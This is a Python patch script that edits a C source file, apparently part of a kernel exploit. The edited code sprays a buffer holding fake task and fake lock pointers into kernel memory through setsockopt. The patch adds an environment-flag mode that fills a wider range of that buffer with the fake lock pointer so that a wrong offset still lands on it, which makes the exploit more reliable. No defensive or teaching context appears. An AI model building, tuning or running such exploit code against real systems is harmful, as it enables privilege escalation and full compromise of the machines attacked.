p = 'src/core/fops.c'
s = open(p).read()
a = '''    unsigned char buf[0x50];
    memset(buf, 0, sizeof buf);
    put64(buf, 0x40, pselect_custom_write_enabled() ? fake_task
                                                    : text_addr(INIT_TASK));
    put64(buf, 0x48, fake_lock);
'''
b = '''    unsigned char buf[0x60];
    memset(buf, 0, sizeof buf);
    if (env_flag("SSOPT_RANGE", 0)) {
      /* diagnostic: paint a solid run so a wrong offset still hits lock */
      for (int i = 0x10; i <= 0x58; i += 8) put64(buf, i, fake_lock);
    } else {
      put64(buf, 0x40, pselect_custom_write_enabled() ? fake_task
                                                      : text_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
    }
'''
assert s.count(a) == 1, ('fill anchor', s.count(a))
s = s.replace(a, b, 1)

a = '''    int ret = setsockopt(sock_paint_fd, SOL_SOCKET, 1000, buf,
                         (socklen_t)sizeof buf);'''
b = '''    socklen_t paint_len = env_flag("SSOPT_RANGE", 0) ? 0x60 : 0x50;
    int ret = setsockopt(sock_paint_fd, SOL_SOCKET, 1000, buf, paint_len);'''
assert s.count(a) == 1, ('len anchor', s.count(a))
s = s.replace(a, b, 1)
open(p, 'w').write(s)
print('range diagnostic added')
